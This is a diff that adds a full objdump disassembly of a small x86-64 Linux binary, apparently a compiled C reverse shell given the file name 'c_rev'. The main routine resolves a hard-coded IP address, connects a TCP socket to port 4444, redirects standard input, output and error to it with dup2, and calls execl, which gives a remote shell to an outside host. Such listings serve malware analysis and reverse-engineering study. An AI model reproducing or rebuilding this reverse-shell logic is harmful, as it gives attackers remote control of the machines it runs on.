@@ -1,0 +1,252 @@
+
+1625371471_c_rev:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+0000000000001000 <_init>:
+    1000:	50                   	push   %rax
+    1001:	e8 cd 01 00 00       	callq  11d3 <frame_dummy>
+    1006:	e8 cf 02 00 00       	callq  12da <__do_global_ctors_aux>
+    100b:	58                   	pop    %rax
+    100c:	c3                   	retq   
+
+Disassembly of section .plt:
+
+0000000000001010 <.plt>:
+    1010:	ff 35 72 2f 00 00    	pushq  0x2f72(%rip)        # 3f88 <_GLOBAL_OFFSET_TABLE_+0x8>
+    1016:	ff 25 74 2f 00 00    	jmpq   *0x2f74(%rip)        # 3f90 <_GLOBAL_OFFSET_TABLE_+0x10>
+    101c:	0f 1f 40 00          	nopl   0x0(%rax)
+
+0000000000001020 <connect@plt>:
+    1020:	ff 25 72 2f 00 00    	jmpq   *0x2f72(%rip)        # 3f98 <connect>
+    1026:	68 00 00 00 00       	pushq  $0x0
+    102b:	e9 e0 ff ff ff       	jmpq   1010 <.plt>
+
+0000000000001030 <execl@plt>:
+    1030:	ff 25 6a 2f 00 00    	jmpq   *0x2f6a(%rip)        # 3fa0 <execl>
+    1036:	68 01 00 00 00       	pushq  $0x1
+    103b:	e9 d0 ff ff ff       	jmpq   1010 <.plt>
+
+0000000000001040 <dup2@plt>:
+    1040:	ff 25 62 2f 00 00    	jmpq   *0x2f62(%rip)        # 3fa8 <dup2>
+    1046:	68 02 00 00 00       	pushq  $0x2
+    104b:	e9 c0 ff ff ff       	jmpq   1010 <.plt>
+
+0000000000001050 <socket@plt>:
+    1050:	ff 25 5a 2f 00 00    	jmpq   *0x2f5a(%rip)        # 3fb0 <socket>
+    1056:	68 03 00 00 00       	pushq  $0x3
+    105b:	e9 b0 ff ff ff       	jmpq   1010 <.plt>
+
+0000000000001060 <__stack_chk_fail@plt>:
+    1060:	ff 25 52 2f 00 00    	jmpq   *0x2f52(%rip)        # 3fb8 <__stack_chk_fail>
+    1066:	68 04 00 00 00       	pushq  $0x4
+    106b:	e9 a0 ff ff ff       	jmpq   1010 <.plt>
+
+0000000000001070 <inet_addr@plt>:
+    1070:	ff 25 4a 2f 00 00    	jmpq   *0x2f4a(%rip)        # 3fc0 <inet_addr>
+    1076:	68 05 00 00 00       	pushq  $0x5
+    107b:	e9 90 ff ff ff       	jmpq   1010 <.plt>
+
+0000000000001080 <htons@plt>:
+    1080:	ff 25 42 2f 00 00    	jmpq   *0x2f42(%rip)        # 3fc8 <htons>
+    1086:	68 06 00 00 00       	pushq  $0x6
+    108b:	e9 80 ff ff ff       	jmpq   1010 <.plt>
+
+0000000000001090 <__libc_start_main@plt>:
+    1090:	ff 25 3a 2f 00 00    	jmpq   *0x2f3a(%rip)        # 3fd0 <__libc_start_main>
+    1096:	68 07 00 00 00       	pushq  $0x7
+    109b:	e9 70 ff ff ff       	jmpq   1010 <.plt>
+
+Disassembly of section .plt.got:
+
+00000000000010a0 <__cxa_finalize@plt>:
+    10a0:	ff 25 32 2f 00 00    	jmpq   *0x2f32(%rip)        # 3fd8 <__cxa_finalize>
+    10a6:	66 90                	xchg   %ax,%ax
+
+00000000000010a8 <__deregister_frame_info@plt>:
+    10a8:	ff 25 32 2f 00 00    	jmpq   *0x2f32(%rip)        # 3fe0 <__deregister_frame_info>
+    10ae:	66 90                	xchg   %ax,%ax
+
+00000000000010b0 <__register_frame_info@plt>:
+    10b0:	ff 25 42 2f 00 00    	jmpq   *0x2f42(%rip)        # 3ff8 <__register_frame_info>
+    10b6:	66 90                	xchg   %ax,%ax
+
+Disassembly of section .text:
+
+00000000000010b8 <_start>:
+    10b8:	48 31 ed             	xor    %rbp,%rbp
+    10bb:	48 89 e7             	mov    %rsp,%rdi
+    10be:	48 8d 35 3b 2d 00 00 	lea    0x2d3b(%rip),%rsi        # 3e00 <_DYNAMIC>
+    10c5:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
+    10c9:	e8 00 00 00 00       	callq  10ce <_start_c>
+
+00000000000010ce <_start_c>:
+    10ce:	50                   	push   %rax
+    10cf:	48 8d 57 08          	lea    0x8(%rdi),%rdx
+    10d3:	48 8b 37             	mov    (%rdi),%rsi
+    10d6:	45 31 c9             	xor    %r9d,%r9d
+    10d9:	4c 8d 05 1c 02 00 00 	lea    0x21c(%rip),%r8        # 12fc <_fini>
+    10e0:	48 8d 0d 19 ff ff ff 	lea    -0xe7(%rip),%rcx        # 1000 <_init>
+    10e7:	48 8d 3d 0c 01 00 00 	lea    0x10c(%rip),%rdi        # 11fa <main>
+    10ee:	e8 9d ff ff ff       	callq  1090 <__libc_start_main@plt>
+
+00000000000010f3 <deregister_tm_clones>:
+    10f3:	48 8d 3d 0e 2f 00 00 	lea    0x2f0e(%rip),%rdi        # 4008 <__TMC_END__>
+    10fa:	48 8d 05 07 2f 00 00 	lea    0x2f07(%rip),%rax        # 4008 <__TMC_END__>
+    1101:	48 39 f8             	cmp    %rdi,%rax
+    1104:	74 0e                	je     1114 <deregister_tm_clones+0x21>
+    1106:	48 8b 05 e3 2e 00 00 	mov    0x2ee3(%rip),%rax        # 3ff0 <_ITM_deregisterTMCloneTable>
+    110d:	48 85 c0             	test   %rax,%rax
+    1110:	74 02                	je     1114 <deregister_tm_clones+0x21>
+    1112:	ff e0                	jmpq   *%rax
+    1114:	c3                   	retq   
+
+0000000000001115 <register_tm_clones>:
+    1115:	48 8d 3d ec 2e 00 00 	lea    0x2eec(%rip),%rdi        # 4008 <__TMC_END__>
+    111c:	48 8d 35 e5 2e 00 00 	lea    0x2ee5(%rip),%rsi        # 4008 <__TMC_END__>
+    1123:	b9 02 00 00 00       	mov    $0x2,%ecx
+    1128:	48 29 fe             	sub    %rdi,%rsi
+    112b:	48 c1 fe 03          	sar    $0x3,%rsi
+    112f:	48 89 f0             	mov    %rsi,%rax
+    1132:	48 99                	cqto   
+    1134:	48 f7 f9             	idiv   %rcx
+    1137:	48 89 c6             	mov    %rax,%rsi
+    113a:	48 85 c0             	test   %rax,%rax
+    113d:	74 0e                	je     114d <register_tm_clones+0x38>
+    113f:	48 8b 05 a2 2e 00 00 	mov    0x2ea2(%rip),%rax        # 3fe8 <_ITM_registerTMCloneTable>
+    1146:	48 85 c0             	test   %rax,%rax
+    1149:	74 02                	je     114d <register_tm_clones+0x38>
+    114b:	ff e0                	jmpq   *%rax
+    114d:	c3                   	retq   
+
+000000000000114e <__do_global_dtors_aux>:
+    114e:	80 3d cb 2e 00 00 00 	cmpb   $0x0,0x2ecb(%rip)        # 4020 <completed.6137>
+    1155:	75 7b                	jne    11d2 <__do_global_dtors_aux+0x84>
+    1157:	55                   	push   %rbp
+    1158:	48 83 3d 78 2e 00 00 	cmpq   $0x0,0x2e78(%rip)        # 3fd8 <__cxa_finalize>
+    115f:	00 
+    1160:	48 89 e5             	mov    %rsp,%rbp
+    1163:	41 54                	push   %r12
+    1165:	53                   	push   %rbx
+    1166:	74 0c                	je     1174 <__do_global_dtors_aux+0x26>
+    1168:	48 8b 3d 91 2e 00 00 	mov    0x2e91(%rip),%rdi        # 4000 <__dso_handle>
+    116f:	e8 2c ff ff ff       	callq  10a0 <__cxa_finalize@plt>
+    1174:	48 8d 05 75 2c 00 00 	lea    0x2c75(%rip),%rax        # 3df0 <__DTOR_LIST__>
+    117b:	48 8d 1d 76 2c 00 00 	lea    0x2c76(%rip),%rbx        # 3df8 <__DTOR_END__>
+    1182:	48 29 c3             	sub    %rax,%rbx
+    1185:	49 89 c4             	mov    %rax,%r12
+    1188:	48 c1 fb 03          	sar    $0x3,%rbx
+    118c:	48 ff cb             	dec    %rbx
+    118f:	48 8b 05 92 2e 00 00 	mov    0x2e92(%rip),%rax        # 4028 <dtor_idx.6139>
+    1196:	48 39 d8             	cmp    %rbx,%rax
+    1199:	73 10                	jae    11ab <__do_global_dtors_aux+0x5d>
+    119b:	48 ff c0             	inc    %rax
+    119e:	48 89 05 83 2e 00 00 	mov    %rax,0x2e83(%rip)        # 4028 <dtor_idx.6139>
+    11a5:	41 ff 14 c4          	callq  *(%r12,%rax,8)
+    11a9:	eb e4                	jmp    118f <__do_global_dtors_aux+0x41>
+    11ab:	e8 43 ff ff ff       	callq  10f3 <deregister_tm_clones>
+    11b0:	48 83 3d 28 2e 00 00 	cmpq   $0x0,0x2e28(%rip)        # 3fe0 <__deregister_frame_info>
+    11b7:	00 
+    11b8:	74 0c                	je     11c6 <__do_global_dtors_aux+0x78>
+    11ba:	48 8d 3d d7 0e 00 00 	lea    0xed7(%rip),%rdi        # 2098 <__EH_FRAME_BEGIN__>
+    11c1:	e8 e2 fe ff ff       	callq  10a8 <__deregister_frame_info@plt>
+    11c6:	5b                   	pop    %rbx
+    11c7:	41 5c                	pop    %r12
+    11c9:	c6 05 50 2e 00 00 01 	movb   $0x1,0x2e50(%rip)        # 4020 <completed.6137>
+    11d0:	5d                   	pop    %rbp
+    11d1:	c3                   	retq   
+    11d2:	c3                   	retq   
+
+00000000000011d3 <frame_dummy>:
+    11d3:	48 83 3d 1d 2e 00 00 	cmpq   $0x0,0x2e1d(%rip)        # 3ff8 <__register_frame_info>
+    11da:	00 
+    11db:	74 18                	je     11f5 <frame_dummy+0x22>
+    11dd:	55                   	push   %rbp
+    11de:	48 8d 35 5b 2e 00 00 	lea    0x2e5b(%rip),%rsi        # 4040 <object.6149>
+    11e5:	48 8d 3d ac 0e 00 00 	lea    0xeac(%rip),%rdi        # 2098 <__EH_FRAME_BEGIN__>
+    11ec:	48 89 e5             	mov    %rsp,%rbp
+    11ef:	e8 bc fe ff ff       	callq  10b0 <__register_frame_info@plt>
+    11f4:	5d                   	pop    %rbp
+    11f5:	e9 1b ff ff ff       	jmpq   1115 <register_tm_clones>
+
+00000000000011fa <main>:
+    11fa:	55                   	push   %rbp
+    11fb:	48 89 e5             	mov    %rsp,%rbp
+    11fe:	48 83 ec 40          	sub    $0x40,%rsp
+    1202:	89 7d cc             	mov    %edi,-0x34(%rbp)
+    1205:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
+    1209:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+    1210:	00 00 
+    1212:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    1216:	31 c0                	xor    %eax,%eax
+    1218:	66 c7 45 e0 02 00    	movw   $0x2,-0x20(%rbp)
+    121e:	48 8d 3d db 0d 00 00 	lea    0xddb(%rip),%rdi        # 2000 <_fini+0xd04>
+    1225:	e8 46 fe ff ff       	callq  1070 <inet_addr@plt>
+    122a:	89 45 e4             	mov    %eax,-0x1c(%rbp)
+    122d:	bf 5c 11 00 00       	mov    $0x115c,%edi
+    1232:	e8 49 fe ff ff       	callq  1080 <htons@plt>
+    1237:	66 89 45 e2          	mov    %ax,-0x1e(%rbp)
+    123b:	ba 00 00 00 00       	mov    $0x0,%edx
+    1240:	be 01 00 00 00       	mov    $0x1,%esi
+    1245:	bf 02 00 00 00       	mov    $0x2,%edi
+    124a:	e8 01 fe ff ff       	callq  1050 <socket@plt>
+    124f:	89 45 dc             	mov    %eax,-0x24(%rbp)
+    1252:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
+    1256:	8b 45 dc             	mov    -0x24(%rbp),%eax
+    1259:	ba 10 00 00 00       	mov    $0x10,%edx
+    125e:	48 89 ce             	mov    %rcx,%rsi
+    1261:	89 c7                	mov    %eax,%edi
+    1263:	e8 b8 fd ff ff       	callq  1020 <connect@plt>
+    1268:	8b 45 dc             	mov    -0x24(%rbp),%eax
+    126b:	be 00 00 00 00       	mov    $0x0,%esi
+    1270:	89 c7                	mov    %eax,%edi
+    1272:	e8 c9 fd ff ff       	callq  1040 <dup2@plt>
+    1277:	8b 45 dc             	mov    -0x24(%rbp),%eax
+    127a:	be 01 00 00 00       	mov    $0x1,%esi
+    127f:	89 c7                	mov    %eax,%edi
+    1281:	e8 ba fd ff ff       	callq  1040 <dup2@plt>
+    1286:	8b 45 dc             	mov    -0x24(%rbp),%eax
+    1289:	be 02 00 00 00       	mov    $0x2,%esi
+    128e:	89 c7                	mov    %eax,%edi
+    1290:	e8 ab fd ff ff       	callq  1040 <dup2@plt>
+    1295:	41 b8 00 00 00 00    	mov    $0x0,%r8d
+    129b:	b9 00 00 00 00       	mov    $0x0,%ecx
+    12a0:	48 8d 15 66 0d 00 00 	lea    0xd66(%rip),%rdx        # 200d <_fini+0xd11>
+    12a7:	48 8d 35 62 0d 00 00 	lea    0xd62(%rip),%rsi        # 2010 <_fini+0xd14>
+    12ae:	48 8d 3d 5e 0d 00 00 	lea    0xd5e(%rip),%rdi        # 2013 <_fini+0xd17>
+    12b5:	b8 00 00 00 00       	mov    $0x0,%eax
+    12ba:	e8 71 fd ff ff       	callq  1030 <execl@plt>
+    12bf:	b8 00 00 00 00       	mov    $0x0,%eax
+    12c4:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
+    12c8:	64 48 33 14 25 28 00 	xor    %fs:0x28,%rdx
+    12cf:	00 00 
+    12d1:	74 05                	je     12d8 <main+0xde>
+    12d3:	e8 88 fd ff ff       	callq  1060 <__stack_chk_fail@plt>
+    12d8:	c9                   	leaveq 
+    12d9:	c3                   	retq   
+
+00000000000012da <__do_global_ctors_aux>:
+    12da:	55                   	push   %rbp
+    12db:	48 89 e5             	mov    %rsp,%rbp
+    12de:	53                   	push   %rbx
+    12df:	48 8d 1d fa 2a 00 00 	lea    0x2afa(%rip),%rbx        # 3de0 <__CTOR_LIST__>
+    12e6:	52                   	push   %rdx
+    12e7:	48 8b 03             	mov    (%rbx),%rax
+    12ea:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
+    12ee:	74 08                	je     12f8 <__do_global_ctors_aux+0x1e>
+    12f0:	ff d0                	callq  *%rax
+    12f2:	48 83 eb 08          	sub    $0x8,%rbx
+    12f6:	eb ef                	jmp    12e7 <__do_global_ctors_aux+0xd>
+    12f8:	58                   	pop    %rax
+    12f9:	5b                   	pop    %rbx
+    12fa:	5d                   	pop    %rbp
+    12fb:	c3                   	retq   
+
+Disassembly of section .fini:
+
+00000000000012fc <_fini>:
+    12fc:	50                   	push   %rax
+    12fd:	e8 4c fe ff ff       	callq  114e <__do_global_dtors_aux>
+    1302:	58                   	pop    %rax
+    1303:	c3                   	retq   
